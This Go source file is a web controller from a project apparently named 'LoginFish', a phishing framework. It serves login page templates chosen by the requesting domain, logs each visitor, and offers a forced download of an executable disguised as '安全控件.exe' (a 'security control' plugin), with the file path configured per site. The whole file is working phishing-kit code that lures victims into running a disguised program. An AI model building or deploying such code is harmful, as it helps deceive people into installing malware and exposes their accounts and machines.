package controller

import (
	"LoginFish/pkg/model"
	"github.com/gin-gonic/gin"
)

type Index struct {
}

func (i *Index) Index(c *gin.Context) {
	model.InsertLog(c, false)
	site := model.GetSite(c.Request.Host)
	if site.ID <= 0 {
		c.String(500, "500")
		return
	}
	c.HTML(200, site.Template, gin.H{
		"title": site.Title,
	})
}
func (i *Index) Download(c *gin.Context) {
	model.InsertLog(c, true)
	site := model.GetSite(c.Request.Host)
	if site.ID <= 0 {
		c.String(500, "500")
		return
	}
	c.Header("Content-Type", "application/octet-stream")
	c.Header("Content-Disposition", "attachment; filename=\"安全控件.exe\"")
	c.Header("Content-Transfer-Encoding", "binary")
	c.File(site.Download)
}
